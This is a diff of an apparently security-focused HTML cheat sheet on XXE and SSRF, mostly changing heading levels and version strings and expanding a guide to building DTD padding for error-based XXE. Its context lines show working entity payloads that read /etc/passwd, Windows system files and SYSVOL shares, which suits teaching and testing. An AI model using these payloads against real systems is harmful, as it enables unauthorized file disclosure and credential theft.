@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=2baeb7d">
+  <link rel="stylesheet" href="/assets/style.css?v=af201b7">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -986,7 +986,7 @@ graph LR
 &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
 <p>In this payload, the entity "xxe" will return the content of the file <code>/etc/passwd</code> since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.</p>
-<h4 id="note-on-encoding">Note on encoding</h4>
+<h5 id="note-on-encoding">Note on encoding</h5>
 <p>The payload above uses <code>ISO-8859-1</code> instead of <code>UTF-8</code>. This is intentional — some system files contain characters outside the ASCII range but within the Latin-1 charset. Declaring <code>ISO-8859-1</code> prevents the parser from failing when it encounters those characters during entity substitution. For files that are pure ASCII, <code>UTF-8</code> works equally well.</p>
 <h3 id="common-unixlinux-files">Common Unix/Linux files</h3>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;          &lt;!-- User accounts --&gt;
@@ -1017,7 +1017,7 @@ graph LR
 &lt;!ENTITY xxe SYSTEM "file:///\\192.168.1.100\c$\Windows\System32\drivers\etc\hosts"&gt;
 &lt;!ENTITY xxe SYSTEM "file:///\\dc.example.com\SYSVOL\example.com\Policies\"&gt;</code></pre>
 <p>Some notes on Windows paths: use forward slashes even on Windows (<code>file:///C:/path/to/file</code>) since backslashes are interpreted as escape characters in XML. UNC paths use <code>file:///\\server\share\file</code>. Some parsers also support alternate data streams: <code>file:///C:/path/file.txt:zone.identifier</code>.</p>
-<h4 id="note-on-unc-path-syntax">Note on UNC path syntax</h4>
+<h5 id="note-on-unc-path-syntax">Note on UNC path syntax</h5>
 <p>The forward slash rule applies to local Windows file paths (<code>file:///C:/path/to/file</code>). UNC paths are an exception — they require the double backslash notation (<code>\\server\share\file</code>) because that is how the UNC convention is defined. Some parsers also accept forward slash equivalents (<code>file:////server/share/file</code>), but backslash notation is more broadly supported for UNC across Java-based parsers.</p>
 <h2 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h2>
 <p>Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally.</p>
@@ -1122,7 +1122,7 @@ graph LR
 &lt;foo&gt;&lt;/foo&gt;</code></pre>
 <p>When the parser expands <code>%error</code> it attempts to resolve the invalid path triggering an error message that includes the contents of <code>/etc/passwd</code>:</p>
 <pre class="highlight"><code>errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"</code></pre>
-<h4 id="a-note-on-parser-strictness">⚠️ A Note on Parser Strictness</h4>
+<h5 id="a-note-on-parser-strictness">⚠️ A Note on Parser Strictness</h5>
 <p>While the payload above is logically correct, it often fails in modern production environments. This is because the W3C XML Specification forbids the expansion of parameter entities (like %eval;) within the internal DTD subset (the part inside the [...] brackets) if they are used to define other markup.</p>
 <p>Many modern, spec-compliant parsers (like those in Java, .NET, or Libxml2) will throw an error as soon as they see %eval; used this way. If your payload is rejected with a "Parameter entity references are not allowed in internal DTD subsets" error, you will need to use other techniques (like OOB exfiltration) to successfully read the file contents.</p>
 <h3 id="bonus-track">Bonus track</h3>
@@ -1264,7 +1264,7 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
-<h4 id="a-note-on-parser-strictness-again">⚠️ A Note on Parser Strictness (again)</h4>
+<h5 id="a-note-on-parser-strictness-again">⚠️ A Note on Parser Strictness (again)</h5>
 <p>While the payload above is logically correct, it often fails in modern production environments. This is because the W3C XML Specification forbids the expansion of parameter entities (like %eval;) within the internal DTD subset (the part inside the [...] brackets) if they are used to define other markup.</p>
 <p>Many modern, spec-compliant parsers (like those in Java, .NET, or Libxml2) will throw an error as soon as they see %eval; used this way. If your payload is rejected with a "Parameter entity references are not allowed in internal DTD subsets" error, you will need to use other techniques (like OOB exfiltration) to successfully read the file contents.</p>
 <h3 id="ws-addressing">WS-Addressing</h3>
@@ -1444,7 +1444,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li><code>%file</code> loads the contents of <code>/etc/passwd</code> from the local filesystem.</li>
 <li><code>%eval</code> creates a new parameter entity <code>%error</code> that references a non-existent file path concatenated with <code>%file</code> content.</li>
 <li>When the parser expands <code>%error</code>, it attempts to resolve the invalid path, triggering an error message that includes the contents of <code>/etc/passwd</code>.</li>
-<li>Note the <code>&lt;!ELEMENT aa (bb'&gt;</code> declaration at the end of the override — <strong>this is the structural padding</strong> that makes the payload syntactically valid when assembled with fonts.dtd. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in 4th point of <a href="### Requirements for Robust Payloads">Requirements for Robust Payloads</a>.</li>
+<li>Note the <code>&lt;!ELEMENT aa (bb'&gt;</code> declaration at the end of the override — <strong>this is the structural padding</strong> that makes the payload syntactically valid when assembled with fonts.dtd. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in 4th point of <a href="### Dissecting the Structural Padding">Dissecting the Structural Padding</a>.</li>
 </ol>
 <ul>
 <li><strong>Step 3:</strong> Trigger Error-Based Exfiltration:
@@ -1481,19 +1481,26 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <p>The padding's job is therefore twofold: introduce a new element name (<code>aa</code>) to give the leftover tokens a valid home, and open a content model parenthesis <code>(</code> that the remainder of the original declaration closes.</p>
 <p>The <code>bb'</code> is simply a placeholder element name that precedes the <code>, (%expr;)</code> tokens from the original declaration. The single quote has no special meaning inside a DTD content model and is tolerated by the parser.</p>
 <h4 id="deriving-the-padding-for-other-dtds">Deriving the Padding for Other DTDs</h4>
-<p>The process is the same regardless of which DTD you are targeting:</p>
+<p>The shape of the padding depends entirely on what the remainder of the original declaration looks like after the first <code>%name;</code> reference. The two most common cases are:</p>
+<p><strong>Case 1: Rich remainder</strong> — the declaration contains additional tokens after <code>%name;</code>, such as further <code>(%expr;)</code> references, commas, or nested parentheses. This is the <code>matrix</code> case. The remainder <code>, (%expr;), (%expr;), (%expr;))&gt;</code> is rich enough that the padding needs to open a content model with a placeholder element to give those tokens a valid home:</p>
+<pre class="highlight"><code>&lt;!ELEMENT aa (bb'</code></pre>
+<p>The single quote is tolerated by the parser and the remainder closes the parenthesis correctly.</p>
+<p><strong>Case 2: Minimal remainder</strong> — the declaration uses a quantifier like <code>*</code>, <code>+</code>, or <code>?</code> directly after <code>%name;</code>, leaving only <code>)*&gt;</code>, <code>)+&gt;</code>, or <code>)?&gt;</code>  as the remainder. This is the case for <code>test</code> and <code>edit</code> in <code>fonts.dtd</code>, both declared as <code>(%expr;)*</code>. Here the remainder is simply <code>)*&gt;</code>, which closes a single open parenthesis and applies the quantifier. The padding only needs to open a content model with a placeholder:</p>
+<pre class="highlight"><code>&lt;!ELEMENT aa (bb</code></pre>
+<p>The assembled result is <code>&lt;!ELEMENT aa (bb)*&gt;</code> — a valid element declaration with a <code>*</code> quantifier. The remainder in this case is minimal enough that no single quote or additional tokens are needed — the padding is simpler than in Case 1.</p>
+<p><strong>The general process</strong> for any DTD is:</p>
 <ol>
 <li>
 <p><strong>Find the injection point.</strong> Locate the declaration where <code>%name;</code> appears inside a <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> body. This is the declaration your override will break open.</p>
 </li>
 <li>
-<p><strong>Identify what precedes <code>%name;</code> in that declaration.</strong> This tells you what your override needs to close. In <code>fonts.dtd</code> the context is <code>((%expr;)</code> — a double open parenthesis. The override closes the inner one with <code>aaa)&gt;</code>, terminating the declaration.</p>
+<p><strong>Identify what precedes <code>%name;</code> in that declaration.</strong> This tells you what your override needs to close. Count open parentheses and determine the minimum tokens needed to terminate the declaration with <code>&gt;</code>.</p>
 </li>
 <li>
-<p><strong>Identify what follows <code>%name;</code> in that declaration.</strong> This is the leftover content your padding needs to absorb. In <code>fonts.dtd</code> the remainder is <code>, (%expr;), (%expr;), (%expr;))&gt;</code>. The padding opens a new <code>&lt;!ELEMENT name (placeholder</code> so those tokens attach to a valid declaration.</p>
+<p><strong>Identify what follows <code>%name;</code> in that declaration.</strong> This is the leftover content your padding needs to absorb. Note whether the remainder is rich (multiple tokens) or minimal (just a quantifier and <code>&gt;</code>).</p>
 </li>
 <li>
-<p><strong>Construct the padding.</strong> The padding must open a new element declaration and a content model that the leftover tokens will close. The placeholder name (<code>aa</code>, <code>bb</code>, or any valid XML name) is irrelevant — it just needs to exist.</p>
+<p><strong>Construct the padding.</strong> Open a new <code>&lt;!ELEMENT name (placeholder</code> where <code>placeholder</code> is any valid XML name. If the remainder is minimal (Case 2), a bare placeholder is sufficient. If the remainder is rich (Case 1), you may need an additional character such as a single quote to separate your placeholder from the incoming tokens.</p>
 </li>
 <li>
 <p><strong>Verify the assembled output is valid DTD.</strong> Mentally substitute your override into the original declaration and check that every <code>&lt;!ELEMENT&gt;</code> and <code>&lt;!ENTITY&gt;</code> that results is syntactically complete.</p>
@@ -1898,6 +1905,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=2baeb7d" defer></script>
+  <script src="/assets/main.js?v=af201b7" defer></script>
 </body>
 </html>
